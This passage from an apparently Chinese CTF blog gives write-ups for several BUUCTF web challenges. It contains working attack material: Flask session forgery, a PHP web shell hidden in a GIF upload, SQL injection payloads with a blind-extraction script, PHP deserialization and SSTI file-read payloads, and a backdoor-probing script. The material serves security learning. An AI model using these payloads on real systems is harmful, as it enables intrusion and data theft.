.eJw90MGKwkAMBuBXWXL2YLvuRfAgjBaFpFRGh8lFdK1tpxOFqmwd8d131gVvIX_4SPKA7bErLzWMr92tHMC2OcD4AR97GIPVOKIU-zzDgI4bDAeP2cZhWAcSO0SzcpiuhM26R1OMYi8h4faVSZGyniYYqk8y7FgdmlzFOV1LrufCat6gxpSikRu8WzMLrNqE1CJFXYzYRMmwZ-HahmXNGTkKi7sNbUpq6aP_xcpLrthbZyfwHMD3pTtur-e2PL1PyP_IUAWKS1uZ9Si2JzP3nLGg4NA6TMjYH9bexbonXXsuJi-ukV1VvqVi4xer6X9y2kkMoLqd97tTBQO4Xcru9TlIhvD8BSJwb7A.YELi9g.D_opOsSTFKn3wKeMF1rcGksx5HA\n```\n\n结果\n\n```\n{'_fresh': True, '_id': b'a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6', 'csrf_token': b'895783633ba12f15aedff2c4b355f0e9cb3158ee', 'image': b'AYHD', 'name': 'guobang', 'user_id': '10'}\n```\n\n然后我们需要吧`name`的值修改为`admin`。修改完成以后还需要回到原来的session格式，那么就需要用到一个加密flask的工具：[flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)\n\n> 这个工具也可以用来解密。我整理的使用方法如下，记得要用双引号`\"\"`括起来\n>\n> python flask_session_cookie_manager{2,3}.py {encode,decode}\n>\n> -s \"SECRET_KEY\"\t\t\t\t\t\t都需要使用\n> -c \"Session cookie value\"\t\t\t\tsession的值 \t 只有解密decode用得到\n> -t \"Session cookie structure\"  \t\tcookie结构    只有encode用得\n\n执行\n\n```\npython flask_session_cookie_manager3.py encode -s \"ckj123\" -t \"{'_fresh': True, '_id': b'a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6', 'csrf_token': b'895783633ba12f15aedff2c4b355f0e9cb3158ee', 'image': b'AYHD', 'name': 'admin', 'user_id': '10'}\"\n```\n\n得到\n\n```\n.eJw90MGKwkAMBuBXWXL2YLvdi-BBGC0KSamMDpOLuNtqO524UJWtI777zrrgLeQPH0nusDv09bmByaW_1iPYtRVM7vD2CROwGjNKcShyDOi4xVB5zLcOwyaQ2DGatcN0LWw2A5oyi72EhLtnJmXKepZgOL6TYceqagsV53QjhV4Iq0WLGlOKRmHwZs08sOoSUssUdZmxiZJhz8KNDauGc3IUljcbupTUykf_g5WXQrG3zk7hMYKvc3_YXb67-vQ6ofgjwzFQXNrKfECxA5mF55wFBcfWYULG_rD2LtYD6cZzOX1yreyP9Usqt365nv0np73EAPaVtCcYwfVc98-_QTKGxy8-U27W.YELpfA.vD1SVCAxOcwOPXc_DbwFqJT1TRg\n```\n\n放在请求头中，格式为\n\n```\ncookie: session=加密内容\n```\n\n\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210306103214.png)\n\n\n\n## 解法二：Unicode欺骗\n\n第二种方法是利用代码中的strlower()函数的使用不当。这个函数分别在注册、登陆、修改密码的地方出现三次。这个方法的思路就是unicode加密三层，在最后一层修改密码时执行函数strlower()后修改到admin的密码。过程为\n\n> ᴬᴰᴹᴵᴺ------注册后------>ADMIN---修改密码--->admin\n\npayload\n\n```\nᴬᴰᴹᴵᴺ\n```\n\n注册以后使用`ᴬᴰᴹᴵᴺ`登陆，然后修改密码时实际修改的就是admin的密码了，然后登陆admin即可。\n\n---\n\n# [极客大挑战 2019]BuyFlag\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png)网站题直接去看源码，在源码也搜索php有两个：index.php、pay.php。前者是首页，直接看后面的那个，打开就有提示\n\n> Only Cuit's students can buy the FLAG\n\n应该还是一道http的套娃题。查看网页的请求发现Cookie中有一个user=0，很可疑，改成user=1，有了下一个提示：输入密码，并且源码中有一段php\n\n```\n<!--\n\t~~~post money and password~~~\nif (isset($_POST['password'])) {\n\t$password = $_POST['password'];\n\tif (is_numeric($password)) {\n\t\techo \"password can't be number</br>\";\n\t}elseif ($password == 404) {\n\t\techo \"Password Right!</br>\";\n\t}\n}\n```\n\n还记得php`==`关系运算会强制转换类型，用POST传一个password=404a，`404a`会被强制转换为`404`，密码就对上了。接下来是钱的问题，flag需要**100000000**块钱我们也去要传过去。如果直接传入这么长的会提示字符串过长，所以我想到了科学计数法，`10e10`，就是10的10次方，通过。最终的请求：\n\n```\nPOST /pay.php HTTP/1.1\nHost: 268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn\nContent-Length: 25\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn/pay.php\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: user=1\nConnection: close\n\npassword=404a&money=10e10\n```\n\n---\n\n# [SUCTF 2019]CheckIn\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201103750.png)\n\n知识点\n\n> .user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。可谓很广，不像.htaccess有局限性，只能是apache.\n\n准备好.user.ini文件内容为自动包含图片马，因为上传会检查文件头，所以添加了一个GIF文件头伪装：\n\n```\nGIF89a\nauto_prepend_file=233.gif\n```\n\n接下来上传图片马，尝试了正常上传PHP马会提示：\n\n> <? in contents!\n\n所以使用script马执行php：\n\n```\nGIF89a\n<script language=\"php\">eval($_REQUEST[shell])</script>\n```\n\n上传成功后会提示文件路径：\n\n> Your dir uploads/852aff287f54bca0ed7757a702913e50\n> Your files :\n> array(5) { [0]=> string(1) \".\" [1]=> string(2) \"..\" [2]=> string(9) \".user.ini\" [3]=> string(7) \"233.gif\" [4]=> string(9) \"index.php\" }\n\n这时候.user.ini文件已经会帮我们自动包含图片马了，所以我们只需要访问一个PHP文件即可，正好上传目录下有一个index.php文件，可以直接蚁剑连接或者POST请求system('cat /flag')。\n\n---\n\n# [BJDCTF2020]Easy MD5\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201105021.png)\n\n参考：\n\n> [【Jarvis OJ】Login--password='\".md5($pass,true).\"]('https://www.jianshu.com/p/12125291f50d)\n>\n> [sql注入：md5($password,true)](https://blog.csdn.net/March97/article/details/81222922)\n>\n> [Leet More 2010 Oh Those Admins! writeup](http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/)\n\n随便输入一些东西都没有反应，在请求头中发现了一个Hint：\n\n> select * from 'admin' where password=md5($pass,true)\n\n**语法**\n\n**md5(string,raw)**\n\n| 参数   | 描述                                                         |\n| ------ | ------------------------------------------------------------ |\n| string | 必需。要计算的字符串。                                       |\n| raw    | 可选。默认不写为FALSE。32位16进制的字符串TRUE。16位原始二进制格式的字符串 |\n\n概括理解，这里如果raw参数为`true`的话，这个函数的返回值是`string`的md5加密值进行十六进制解码的字符串。这道题我当时是直接看了源码跳过了第一层，第一层的答案其实是`ffifdyop`，我们来对它进行一波操作\n\n* 源字符串：ffifdyop\n\n* md5加密值：276f722736c95d99e921722cf9ed621c\n\n* hex解码：'or'6É].é!r,ùíb.\n\n最后那几个应该是不可见字符，重要的是前面一段：`'or'6`，这里还要说明一下，这提示应该不算严谨，真正的sql语句应该是在md5函数前后各一个`'`单引号。执行以后真正的sql语句为\n\n```\nselect * from 'admin' where password=''or'6É].é!r,ùíb.‘\n```\n\n可以看到原理是构成一个闭合，这里还有第二个知识点，是or后面的字符串被认为是true，引用文章里的一段：\n\n> a string starting with a `1` is cast as an integer when used as a boolean.\n>\n> 在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。\n\n自己进行的测试：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113825.png)\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113839.png)\n\n所以真正的解法是只要sql语句的格式为password='xxxxxxxx' or '1xxxx'，即hex包含字符串\"276f722731\"（'or'1），其实or后面开头只要是数字即可，1-9的hex范围为31-39。\n\n下面这个程序是这道题开头参考列表中的第三个链接。\n\n```\n<?php \nfor ($i = 0;;) { \n for ($c = 0; $c < 1000000; $c++, $i++)\n  if (stripos(md5($i, true), '\\'or\\'') !== false)\n   echo \"\\nmd5($i) = \" . md5($i, true) . \"\\n\";\n echo \".\";\n}\n?>\n```\n\n这个程序遍历数字进行md5加密，使用stripos匹配是否有`'or'`，这个函数有一个弊病就是如果是以`'or'`开头的不会匹配到，并且我们需要的是or后面以数字开头都可以，所以需要稍微做一些修改，使用正则表达式由`\\'or\\'`改为`'or'([1-9]+|0+[1-9])`<span class=\"heimu\"> 不过我的方法自己还没跑出来🤣，回头加个多线程试一试</span>\n\n（更新）\n\n自己写了一个python程序，放在学生服务器上跑了一个下午加一个晚上，出了两个答案，好家伙从1跑到52亿：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210203094304.png)\n\n```\n 找到了md5(2413633098): \n 找到了md5(5207660362): \n 找到了md5(8351555222): \n 找到了md5(13095770027): \n 找到了md5(14860117901): \n 找到了md5(15724086109): \n 找到了md5(16529176061): \n 找到了md5(17428338265): \n 找到了md5(18717303578):\n 找到了md5(19342380396): \n 找到了md5(23960028257): \n 找到了md5(32561902614): \n 找到了md5(38983153698): \n 找到了md5(39742292223): \n 找到了md5(44120894060): \n 找到了md5(44820604888): \n 找到了md5(45570673322): \n 找到了md5(45855250502): \n 找到了md5(53660569009): \n 找到了md5(55098175010): \n 找到了md5(59763304323): \n 找到了md5(60185044906): \n 找到了md5(68625783421): \n 找到了md5(70949326264): \n (md5值删了，因为乱码会影响博客的搜索功能)\n```\n\n程序源码如下（自己写着玩，轻喷）：\n\n```\n# codeing = utf-8\n\nimport threading\nimport hashlib\nimport re\nimport itertools\nimport time\n# r'\\'or\\'([1-9]+|0+[1-9])'\n# r'\\'or\\''\npattern=re.compile(r'\\'or\\'([1-9]+|0+[1-9])',re.I)\nitem = itertools.count(1)\n\ndef thrfunc():\n    while 1:\n        s2 = ''\n        temp = str(next(item))\n        s1 = hashlib.md5(temp.encode(encoding='UTF-8')).hexdigest()\n        for i in range(0, len(s1), 2):\n            s2 = s2 + chr(int(s1[i:i + 2], 16))\n        if re.search(pattern, s2):\n            print(\"找到了md5(\" + temp + \"): \" + s2)\n\n\nthreads=[]\nfor i in range(10):\n    t = threading.Thread(target=thrfunc)\n    threads.append(t)\n    t.start()\n\n```\n\n虽然不知道多整几个能用的值可以干什么，但是觉得自己写的程序跑出来答案就很爽🤣。\n\n还有一个能用的md5值：\n\n```\ncontent: 129581926211651571912466741651878684928\nhex: 06da5430449f8f6f23dfc1276f722738\nraw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1'or'8\nstring: T0Do#'or'8\n```\n\n以上是第一层。**其实看了源码里只验证了字符串是否等于`ffifdyop`我写的脚本里的值肯定通过不了**\n\n第二层可以直接在源码中看到注释。\n\n```\n$a = $GET['a'];\n$b = $_GET['b'];\n\nif($a != $b && md5($a) == md5($b)){\n    // wow, glzjin wants a girl friend.\n```\n\n简单的md5以0E开头\n\n```\na=QNKCDZO&b=240610708\n```\n\n第三层\n\n```\n<?php\nerror_reporting(0);\ninclude \"flag.php\";\n\nhighlight_file(__FILE__);\n\nif($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){\n    echo $flag;\n}\n```\n\n这一有一些不同的是md5比较使用了`===`不仅比较类型还比较值。但是md5有一个：\n\n```\nmd5([1,2,3]) == md5([4,5,6]) == NULL\n```\n\n所以传入两个数组，又能保证两个变量不相等，md5加密有都是NULL且类型是数组类型，注意数组里的值还是不可以一样的。\n\n```\nparam1[]=1&param2[]=2\n```\n\n---\n\n# [ZJCTF 2019]NiZhuanSiWei\n\n源码\n\n```\n<?php  \n$text = $_GET[\"text\"];\n$file = $_GET[\"file\"];\n$password = $_GET[\"password\"];\nif(isset($text)&&(file_get_contents($text,'r')===\"welcome to the zjctf\")){\n    echo \"<br><h1>\".file_get_contents($text,'r').\"</h1></br>\";\n    if(preg_match(\"/flag/\",$file)){\n        echo \"Not now!\";\n        exit(); \n    }else{\n        include($file);  //useless.php\n        $password = unserialize($password);\n        echo $password;\n    }\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\n先来一段[PHP伪协议总结](https://segmentfault.com/a/1190000018991087)，这题的第一步是判断传入text参数并读取内容，判断内容为**welcome to the zjctf**，使用`data://`伪协议。\n\n```\n?text=data://text/plain,welcome to the zjctf\n```\n\n接下来是文件包含，有了提示`useless.php`肯定要读一读看看，使用`php://filter`伪协议。\n\n```\n?text=data://text/plain,welcome to the zjctf&file=php://filter/convert.base64-encode/resource=useless.php\n```\n\n得到的内容\n\n```\n<?php  \n\nclass Flag{  //flag.php  \n    public $file;  \n    public function __tostring(){  \n        if(isset($this->file)){  \n            echo file_get_contents($this->file); \n            echo \"<br>\";\n        return (\"U R SO CLOSE !///COME ON PLZ\");\n        }  \n    }  \n}  \n?>  \n```\n\n并且文件包含下面有一个反序列化，又看到了`__tostring`函数，**当一个对象被当作字符串对待的时候，会触发这个魔术方法**。我构造的对象\n\n```\n<?php \nclass Flag{  \n    public $file=\"flag.php\";  \n}\n\n$f = new Flag();\necho serialize($f);\n\n//O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\n```\n\n在传入对象之前当然要把读取文件流改为正常包含文件了。最终payload\n\n```\n?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\n```\n\n---\n\n\n\n# [CISCN2019 华北赛区 Day2 Web1]Hack World\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307171921.png)\n\n很明显的sql注入，随便尝试一些语句有\n\n> 1\t>>\tHello, glzjin wants a girlfriend.\n>\n> 2\t>>\tDo you want to be my girlfriend?\n>\n> 3之后都是\t>>\tError Occured When Fetch Result.\n\n输入一个单引号`1'`出现了`bool(false)`，是一个布尔类型返回，就很有可能是盲注之类的。测试的时候还发现空格被过滤了，空格被过滤可以尝试使用TAB制表符代替。\n\n题目中也有提示\n\n> ### All You Want Is In Table 'flag' and the column is 'flag'\n\n说明flag在flag表的flag字段中。以下是一个布尔盲注的脚本，思路就是查询flag的值使用`substr`函数每次截取一个字符，获得其`ascii`值再使用二分法确定具体的值，最后拼接输出。\n\n```python\nimport requests\nimport time\n\nurl = 'http://26670c55-697e-4520-ae0a-bd23a786cd72.node3.buuoj.cn/'\nresult = ''\n\nfor x in range(1, 50):\n\thigh = 127\n\tlow = 32\n\tmid = (low + high) // 2\n\twhile high>low:\n\t\tpayload = \"if(ascii(substr((select\tflag\tfrom\tflag),%d,1))>%d,1,2)\" % (x, mid)\n\t\tdata = {\n\t\t\t\"id\":payload\n\t\t}\n\t\ttime.sleep(0.3)\n\t\tresponse = requests.post(url, data = data)\n\t\tif 'Hello' in response.text:\n\t\t\tlow=mid+1\n\t\telse:\n\t\t\thigh = mid\n\t\tmid = (low+high)/2\n\n\tresult += chr(int(mid))\n\tprint(result)\n\t\n#flag{929c8993-2d85-4fbf-8e48-7c457551105e}\n```\n\n---\n\n# [极客大挑战 2019]HardSQL\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307173126.png)\n\n还是sql注入题。尝试在输入框里输入`#`、`--+`时被拦下了，但是在url中使用%23通过了。尝试了union但是被过滤了，使用双写也不通过，和这道题同类型的题前面有Baby SQL、Easy SQL，考点还剩下的有盲注、报错注入、堆叠注入。尝试报错注入可以使用，我参考的[十种MySQL报错注入](https://www.cnblogs.com/wocalieshenmegui/p/5917967.html)。还需要注意空格是会被拦下的，url编码也不能通过，所以在语句中的表名需要使用`()`隔开，具体payload如下：\n\n1. 爆表\n\n```sql\n?username=admin%27or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e)))%23&password=1\n```\n\n当前表名是：H4rDsq1\n\n2. 爆字段\n\n```sql\n?username=admin%27or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e)))%23&password=1\n```\n\n当前表的字段有：id,username,password\n\n1. 出数据\n\n如果使用正常的查询语句会因为flag的长度太长，页面中的回显长度不能显示全，但是可以使用`left`和`right`函数：\n\n> 语法：LEFT(ARG,LENGTH)、RIGHT(ARG,LENGTH)\n\n这两个函数会用到选取的长度，如果想要拼成一个完整的flag，可以先用length查看总长度，计算以后拼一下\n\n```sql\n?username=admin%27or(extractvalue(1,concat(0x7e,(select(left(password,35))from(H4rDsq1)),0x7e)))%23&password=1\n```\n\nflag{112bb5db-17a4-47e2-97b4-19\n\n```sql\n?username=admin%27or(extractvalue(1,concat(0x7e,(select(right(password,11))from(H4rDsq1)),0x7e)))%23&password=1\n```\n\ndc295a017f}\n\n---\n\n\n\n# [网鼎杯 2018]Fakebook\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307174819.png)\n\n是一个展示自己博客网址的列表，先随便注册一个\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307175313.png)\n\n我填的是baidu的网址23333。这时的url是：\n\n```url\nhttp://2cefe2a5-4e68-44ce-870c-3628c2500cd3.node3.buuoj.cn/view.php?no=1\n```\n\n看到了no=1，应该想到了sql注入，我没有试出什么名堂，但是在网上找到了一个这道题的非预期解：[[网鼎杯2018\\]fakebook题解](https://www.cnblogs.com/kevinbruce656/p/12643338.html)，使用了`load_file`函数直接读取了flag文件。同样是空格被过滤，但是可以使用`/**/`绕过。\n\n## 非预期解\n\n```code\n?no=-1 union/**/select 1,2,3,4\n```\n\n先使用上面的语句查看回显点。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307180356.png)\n\n找的了位置2的回显点，可以把函数替换在2的位置上。\n\n```code\n?no=-1 union/**/select 1,load_file('/var/www/html/flag.php'),3,4\n```\n\n参考师傅的博客中是使用了盲注获得flag的，其实执行以后使用页面的选取工具选取回显的标签块，可以在注释里找的到🤣\n\n## 预期解\n\n正常的sql注入一套查询，同样是使用`/**/`绕过空格过滤。\n\n爆表\n\n```code\n?no=-1%20union/***/select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=database()%23\n```\n\n爆字段\n\n```code\n?no=-1 union/***/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users' %23\n```\n\n出数据\n\n```code\n?no=-1 union/***/select 1,group_concat(no,username,passwd,data),3,4 from users\n```\n\n查询的结果是一大串字符串，但是在结尾一个PHP的序列化对象：\n\n```code\nO:8:\"UserInfo\":3:{s:4:\"name\";s:7:\"guobang\";s:3:\"age\";i:18;s:4:\"blog\";s:20:\"http://www.baidu.com\";}\n```\n\n说明网站是使用反序列化获取对应栏的数据，下面有一个iframe的标签，根据提示**the contents of his/her blog**，得知我们提供的网址会在这里显示，正好有一个php伪协议file://可以读取本地文件，思路就是：**使用伪协议读取flag作为blog网站回显在iframe的标签中**，所以构造一个序列化对象。 \n\n```php\n<?php\n\nclass UserInfo\n{\n    public $name = \"guobang\";\n    public $age = 18;\n    public $blog = \"file:///var/www/html/flag.php\";\n}\n\n$s = new UserInfo();\necho serialize($s);\n\n//O:8:\"UserInfo\":3:{s:4:\"name\";s:7:\"guobang\";s:3:\"age\";i:18;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}\n```\n\n最终payload\n\n```code\n?no=-1%20union/***/select%201,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:7:\"guobang\";s:3:\"age\";i:18;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}' from%20users\n```\n\n在iframe里面找，是一个data:text/html的数据格式，base64加密的噢。\n\n---\n\n# [网鼎杯 2020 青龙组]AreUSerialz\n\n部分图\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308102316.png)\n\n最下面有对于payload的限制：\n\n```php\nfunction is_valid($s) {\n    for($i = 0; $i < strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))\n            return false;\n    return true;\n}\nif(isset($_GET{'str'})) {\n\n    $str = (string)$_GET['str'];\n    if(is_valid($str)) {\n        $obj = unserialize($str);\n    }\n\n}\n```\n\n需要payload中的字符ascii码值`大于`32`小于`125。注意到最后有一个`unserialize`函数，判断这道题考点是反序列化。接下来分析源码：\n\n* `process()`函数判断op的值，如果是`1`就写入文件，如果是`2`就读取文件。代码开头包含了`flag.php`文件，所以推测需要使用2操作数读取flag.php文件。\n* `write()`把对象中的`$content`属性值写入到`$filename`文件中，如果长度大于100会被拦下。\n* `read()`使用**file_get_contents()**函数读取文件。**正是我们想要的**。\n* `output()`输出内容。\n* `__destruct()`对象销毁时会执行的函数，需要注意的是**if**判断里的`$this->op === \"2\"`是强比较，并且会修改op的值为1（写文件），因为**\"2\"**是一个字符串类型的如果传入**整型的2**即可绕过。\n\n所以我们构造一个对象**op**为2，**filename**为flag.php即可，读文件的时候肯定不是\n\n接下来是反序列化时会遇到的问题，因为对象中属性的修饰是`protected`，序列化时需要保证一致的。\n\n先给出自己创建的对象源码\n\n```php\n<?php\nclass FileHandler {\n\n    protected  $op=2;\n    protected  $filename=\"/var/www/html/flag.php\";\n    protected  $content;\n}\n\n$c = new FileHandler();\necho serialize($c);\n```\n\n1. PHP7.1以上版本对属性类型不敏感、用public绕过:\n\n```code\nO:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:22:\"/var/www/html/flag.php\";s:7:\"content\";N;}\n```\n\n运行以后可以在网页注释中找到文件。绝对路径读取也可以，我第一次使用php://filter读再去解码也成功了。\n\n```code\nO:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:52:\"php://filter/convert.base64-encode/resource=flag.php\";s:7:\"content\";N;}\n```\n\n2. 序列化字符串中s替换为S，支持字符串用16进制，\n\n```code\nO:11:\"FileHandler\":3:{S:5:\"\\00*\\00op\";i:2;S:11:\"\\00*\\00filename\";S:22:\"/var/www/html/flag.php\";S:10:\"\\00*\\00content\";N;}\n```\n\n\n\n思路：https://blog.csdn.net/Oavinci/article/details/106998738\n\n---\n\n# [MRCTF2020]你传你🐎呢\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308104930.png)\n\n测试后缀，php、phtml都被过滤了，htaccess可以，先传上特供的`.htaccess`\n\n```code\nSetHandler application/x-httpd-php\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105247.png)\n\n传图片马，我一直用的是GIF马，几次尝试都没通过，后来修改了`Content-Type: image/jpeg`可以了，说明Content-Type是GIF还不行，接下来直接传图片码\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105652.png)\n\n根据地址访问图片马的地址，使用system读文件还没成，用蚁剑连了执行执行ret=127,disable_function了\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110126.png)\n\n不过根目录下的flag文件还是可以正常读取，至于disable_function可以参考[【极客大挑战 2019】RCE ME](https://braindance.tk/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/)。\n\n---\n\n# [BJDCTF 2nd]fake google\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110510.png)\n\n就一个输入框，随便输入一个去看看，跳转以后\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110545.png)\n\n注释里有提示ssti，应该是模板注入，就在网上搜一个ssti的payload试试[SSTI (服务器模板注入)](https://blog.csdn.net/qq_40657585/article/details/83657220)\n\n\n\n\n\n找到了一个直接读文件的payload\n\n```code\n?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/flag', 'r').read() }}{% endif %}{% endfor %}\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110717.png)\n\n---\n\n# [GYCTF2020]Blacklist\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110821.png)\n\nsql注入，先试一试堆叠注入，可以执行，尝试select的时候返回了过滤内容\n\n```php\nreturn preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject);\n```\n\n前面还有一个堆叠注入的是新姿势**[强网杯 2019]随便注**，一种是使用prepare预处理语句，另一种是修改表名，根据上面的过滤内容，两种方法都被过滤了。先试试查看表：\n\n```sql\n-1';show tables;\n\nFlagHere\nwords\n```\n\n查看表结构：\n\n```sql\n-1';desc `FlagHere`;\n```\n\n接下来是看的wp，学到了个新姿势：使用`HANDLER ... OPEN`语句，贴一个[官方文档](https://dev.mysql.com/doc/refman/8.0/en/handler.html)。\n\n`HANDLER ... OPEN`语句打开一个表，使其可以使用后续`HANDLER ... READ`语句访问，该表对象未被其他会话共享，并且在会话调用`HANDLER ... CLOSE`或会话终止之前不会关闭\n\n```sql\n-1';handler FlagHere open;handler FlagHere read first;handler FlagHere close\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308111414.png)\n\n---\n\n# [强网杯 2019]高明的黑客\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308112326.png)\n\n下载源码以后一堆不可读的源码，但是里面有很多shell，看不懂所以找了wp，思路就是用脚本匹配文件中的shell，然后传参试一试每一个shell是否能用，抄脚本\n\n```python\n# codeing = utf-8\n\nimport  requests\nimport os\nimport re\nimport threading\nimport time\n\nrequests.adapters.DEFAULT_RETRIES = 8\nsession = requests.session()\nsession.keep_alive = False\n\nsem=threading.Semaphore(30)\n\nurl=\"http://84fa677d-e4dd-47a1-9124-1823cc996d12.node3.buuoj.cn/\"\n\npath = \"D:\\DROPS\\phpstudy_pro\\WWW\\ctf\\src\\\\\"\nfileNames = os.listdir(path)\n\nrrGET = re.compile(r\"\\$_GET\\[\\'(\\w+)\\'\\]\")\nrrPOST = re.compile(r\"\\$_POST\\[\\'(\\w+)\\'\\]\")\n\nlocal_file = open(\"flag.txt\",\"w\",encoding=\"utf-8\")\n\ndef run(fileName):\n    with sem:\n        file = open(path+fileName,'r',encoding='utf-8')\n        content = file.read()\n        print(\"[+]checking: %s\"%fileName)\n\n        #GET\n        for i in rrGET.findall(content):\n            r = session.get(url+\"%s?%s=%s\"%(fileName,i,\"echo ~guobanghhh~\"))\n            if \"~guobanghhh~\" in r.text:\n                flag = fileName + \"中的\" + i + \"可以用！！！\"\n                print(flag)\n                local_file.write(flag)\n\n        #POST\n        # for i in rrPOST.findall(content):\n        #     r = session.post(url+fileName,data={i:\"echo ~guobanghhh~\"})\n        #     if \"~guobanghhh~\" in r.text:\n        #         flag = fileName + \"中的\" + i + \"可以用！！！\"\n        #         print(flag)\n        #         local_file.write(flag)\n\nif __name__ == '__main__':\n    run(\"xk0SzyKwfzw.php\")\n    start_time = time.time()  # 开始时间\n    print(\"[start]程序开始:\" + str(start_time))\n    thread_list = []\n    for fileName in fileNames:\n        t = threading.Thread(target=run,args=(fileName,))\n        thread_list.append(t)\n    for t in thread_list:\n        t.start()\n    for t in thread_list:\n        t.join()\n\n```\n\n结果就是访问\n\n```url\nhttp://dd1c66d5-66b2-4b82-a2a8-bf7bfbecdd97.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag\n```\n\n获得flag\n\n---\n\n# [MRCTF2020]Ez_bypass\n\n不截图了，主页没有代码格式，贴一个源码\n\n```php\nI put something in F12 for you\ninclude 'flag.php';\n$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';\nif(isset($_GET['gg'])&&isset($_GET['id'])) {\n    $id=$_GET['id'];\n    $gg=$_GET['gg'];\n    if (md5($id) === md5($gg) && $id !== $gg) {\n        echo 'You got the first step';\n        if(isset($_POST['passwd'])) {\n            $passwd=$_POST['passwd'];\n            if (!is_numeric($passwd))\n            {\n                 if($passwd==1234567)\n                 {\n                     echo 'Good Job!';\n                     highlight_file('flag.php');\n                     die('By Retr_0');\n                 }\n                 else\n                 {\n                     echo \"can you think twice??\";\n                 }\n            }\n            else{\n                echo 'You can not get it !';\n            }\n\n        }\n        else{\n            die('only one way to get the flag');\n        }\n}\n    else {\n        echo \"You are not a real hacker!\";\n    }\n}\nelse{\n    die('Please input first');\n}\n}Please input first\n```\n\n分析一波：\n\n* 第7行是第一层需要md5的值相同但是两个变量不同，需要注意是强比较`===`噢。\n* 第11、17行判断passwd是非数字并且若比较`==`等于1234567\n\n第一个利用数组即可绕过\n\n```code\nmd5([1,2,3]) == 